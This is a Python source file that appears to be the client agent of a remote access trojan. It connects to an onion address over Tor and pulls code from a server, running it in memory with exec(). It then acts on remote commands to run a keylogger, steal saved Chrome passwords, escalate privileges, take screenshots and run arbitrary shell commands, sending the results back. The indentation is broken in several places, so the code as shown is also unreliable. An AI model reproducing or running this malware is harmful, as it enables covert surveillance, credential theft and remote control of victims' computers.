import json
import os
import socket
import sys
import importlib.util
from base64 import b64decode
import requests

# Minimal tor network import for initial connection
from tor_network import ClientSocket, Tor

ENCODING = 'utf-8'

class MemoryModule:
    """Handles in-memory module loading"""
    @staticmethod
    def load_module_from_code(code, module_name):
        try:
            # Create module spec
            spec = importlib.util.spec_from_loader(
                module_name, 
                loader=None, 
                origin="<memory>"
            )
            
            # Create module
            module = importlib.util.module_from_spec(spec)
            
            # Add to sys.modules
            sys.modules[module_name] = module
            
            # Execute module code
            exec(code, module.__dict__)
            
            return module
        except Exception as e:
            print(f"Failed to load module {module_name}: {e}")
            return None

class Agent:
    def __init__(self):
        self.modules = {}
        self.server_url = "http://127.0.0.1:5555"
        self.setup_connection()

    def setup_connection(self):
        """Setup initial connection and get available tools"""
        global s
        tor = Tor()
        onion, port = tor.read_address_from_binary()
        client = ClientSocket(onion, port)
        s = client.create_connection()

    def load_module(self, module_name):
        """Load module from server into memory"""
        try:
            if module_name in self.modules:
                return self.modules[module_name]

            # Get module code from server
            response = requests.get(f"{self.server_url}/tools/{module_name}.py")
            if response.status_code != 200:
                raise Exception(f"Failed to get module {module_name}")

            # Load module into memory
            module = MemoryModule.load_module_from_code(
                response.text,
                module_name
            )

            if module:
                self.modules[module_name] = module
                return module
            
            raise Exception(f"Failed to load module {module_name}")
        except Exception as e:
            print(f"Error loading module {module_name}: {e}")
            return None

    def reliable_send(self, data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode(ENCODING))

    def reliable_recv(self):
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode(ENCODING).rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except socket.error:
                raise

    def execute_module_function(self, module_name, function_name, *args, **kwargs):
        """Execute a function from a loaded module"""
        try:
            module = self.load_module(module_name)
            if module and hasattr(module, function_name):
                return getattr(module, function_name)(*args, **kwargs)
            return None
    except Exception as e:
            print(f"Error executing {function_name} from {module_name}: {e}")
            return None

    def shell(self):
        while True:
            command = self.reliable_recv()
            
            if command == 'quit':
                break
                
            elif command[:12] == 'keylog_start':
                result = self.execute_module_function('keylogger', 'start_keylogger')
                self.reliable_send('[+] Keylogger Started!' if result else '[-] Keylogger failed to start')
                
            elif command[:11] == 'keylog_dump':
                logs = self.execute_module_function('keylogger', 'dump_logs')
                self.reliable_send(logs if logs else '[-] No logs available')
                
            elif command[:11] == 'keylog_stop':
                result = self.execute_module_function('keylogger', 'stop_keylogger')
                self.reliable_send('[+] Keylogger Stopped!' if result else '[-] Failed to stop keylogger')
                
            elif command[:11] == 'chrome_pass':
                passwords = self.execute_module_function('chrome', 'get_passwords')
                self.reliable_send(passwords if passwords else '[-] Failed to get passwords')
                
            elif command[:9] == 'privilege':
                result = self.execute_module_function('privilege', 'escalate')
                self.reliable_send(result if result else '[-] Privilege escalation failed')
                
        elif command[:10] == 'screenshot':
                screenshot = self.execute_module_function('screenshot', 'capture')
                if screenshot:
                    self.reliable_send(screenshot)
                else:
                    self.reliable_send('[-] Screenshot failed')

        else:
                # Default command execution
                try:
                    import subprocess
                    execute = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )
            result = execute.stdout.read() + execute.stderr.read()
                    self.reliable_send(result.decode())
                except Exception as e:
                    self.reliable_send(f"[-] Error executing command: {e}")

def main():
    agent = Agent()
    agent.shell()

if __name__ == '__main__':
    main()